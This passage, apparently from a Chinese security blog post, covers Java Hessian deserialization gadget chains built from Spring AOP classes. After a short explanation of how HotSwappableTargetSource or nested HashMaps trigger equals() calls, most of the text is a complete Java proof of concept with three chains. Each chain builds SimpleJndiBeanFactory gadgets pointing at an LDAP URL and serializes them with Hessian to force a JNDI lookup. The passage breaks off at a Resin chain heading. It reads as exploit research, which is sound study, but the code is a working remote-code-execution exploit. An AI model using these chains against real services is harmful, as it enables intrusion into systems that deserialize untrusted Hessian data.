<code>JNDI</code> 注入。</p><p><img src="/imgs/Pasted%20image%2020240313001847.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><code>marshalsec</code> 中这里第一个链子的 <code>poc</code> 触发了两次任意 <code>equals()</code> 调用： <code>HotSwappableTargetSource.equals()</code> 任意调用其它的 <code>equals()</code> 。原因是 <code>HashMap#put()</code> 中只有两个 <code>map</code> 中的 <code>hashCode</code> 一样才会对其调用 <code>equals()</code> 方法，而 <code>HotSwappableTargetSource#hashCode()</code> 返回的是一个恒定的值，就可以绕过这里 <code>hash</code> 的验证。当然，我们也可以不用这个类，用前面 <code>fastjson</code> 中用过的技巧，<code>HashMap</code> 里面放 <code>HashMap</code> ，构造内部 <code>HashMap</code> 的 <code>key</code> 的 <code>hash</code> 一样，这里不细说了。</p><p>第一个链子的方法调用栈：</p><p><img src="/imgs/Pasted%20image%2020240313000643.png"></p><p>三者的 <code>poc</code> 如下：（第一个链子的 <code>poc</code> 有两种写法）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.impl.NoOpLog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AbstractAspectJAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&#123;</span></span><br><span class="line"><span class="meta">            &quot;unchecked&quot;</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                              Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        poc1();</span></span><br><span class="line"><span class="comment">//        poc2();</span></span><br><span class="line">        poc3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 链子1：不利用HotSwappableTargetSource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:1389/obj&quot;</span>;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">AspectInstanceFactory</span> <span class="variable">aif</span> <span class="operator">=</span> createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        setFieldValue(aif, <span class="string">&quot;beanFactory&quot;</span>, bf);</span><br><span class="line">        setFieldValue(aif, <span class="string">&quot;name&quot;</span>, jndiUrl);</span><br><span class="line"></span><br><span class="line">        <span class="type">AbstractAspectJAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> createWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        setFieldValue(advice, <span class="string">&quot;aspectInstanceFactory&quot;</span>, aif);</span><br><span class="line"></span><br><span class="line">        <span class="type">AspectJPointcutAdvisor</span> <span class="variable">advisor</span> <span class="operator">=</span> createWithoutConstructor(AspectJPointcutAdvisor.class);</span><br><span class="line">        setFieldValue(advisor, <span class="string">&quot;advice&quot;</span>, advice);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; pcahCl = Class.forName(<span class="string">&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">pcah</span> <span class="operator">=</span> createWithoutConstructor(pcahCl);</span><br><span class="line">        setFieldValue(pcah, <span class="string">&quot;advisor&quot;</span>, advisor);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>, pcah);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>, pcah);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(map, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, aClass);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Array.newInstance(aClass, <span class="number">2</span>);</span><br><span class="line">        Array.set(o, <span class="number">0</span>, constructor.newInstance(<span class="number">0</span>, hashMap1, <span class="string">&quot;a&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        Array.set(o, <span class="number">1</span>, constructor.newInstance(<span class="number">0</span>, hashMap2, <span class="string">&quot;b&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> map.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(map, o);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(map);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 链子1：利用HotSwappableTargetSource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:1389/obj&quot;</span>;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">AspectInstanceFactory</span> <span class="variable">aif</span> <span class="operator">=</span> createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        setFieldValue(aif, <span class="string">&quot;beanFactory&quot;</span>, bf);</span><br><span class="line">        setFieldValue(aif, <span class="string">&quot;name&quot;</span>, jndiUrl);</span><br><span class="line"></span><br><span class="line">        <span class="type">AbstractAspectJAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> createWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        setFieldValue(advice, <span class="string">&quot;aspectInstanceFactory&quot;</span>, aif);</span><br><span class="line"></span><br><span class="line">        <span class="type">AspectJPointcutAdvisor</span> <span class="variable">advisor</span> <span class="operator">=</span> createWithoutConstructor(AspectJPointcutAdvisor.class);</span><br><span class="line">        setFieldValue(advisor, <span class="string">&quot;advice&quot;</span>, advice);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; pcahCl = Class.forName(<span class="string">&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">pcah</span> <span class="operator">=</span> createWithoutConstructor(pcahCl);</span><br><span class="line">        setFieldValue(pcah, <span class="string">&quot;advisor&quot;</span>, advisor);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pcah);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(map, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(map, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(map);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream);</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 链子二</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc3</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:1389/obj&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line">        setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">pcadv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        pcadv.setBeanFactory(bf);</span><br><span class="line">        pcadv.setAdviceBeanName(jndiUrl);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>(), <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>(), <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, pcadv, pcadv, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.setSerializerFactory(serializerFactory);</span><br><span class="line">        hessian2Output.writeObject(s);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Resin链"><a href="#Resin链" class="headerlink" title="Resin链"></a>Resin链</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>quercus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.45<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" 